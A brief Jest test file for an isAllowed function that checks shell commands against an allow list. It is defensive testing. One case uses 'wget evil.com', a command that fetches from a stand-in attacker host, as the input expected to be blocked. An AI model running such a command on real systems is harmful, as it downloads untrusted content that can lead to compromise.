import { isAllowed } from '../isAllowed.js';

describe('isAllowed', () => {
  it.each([
    { command: 'echo hello', allowList: ['echo'], expected: true },
    { command: 'wget evil.com', allowList: ['echo'], expected: false },
  ])('$command with $allowList', ({ command, allowList, expected }) => {
    const actual = isAllowed(command, allowList);
    expect(actual).toBe(expected);
  });
});
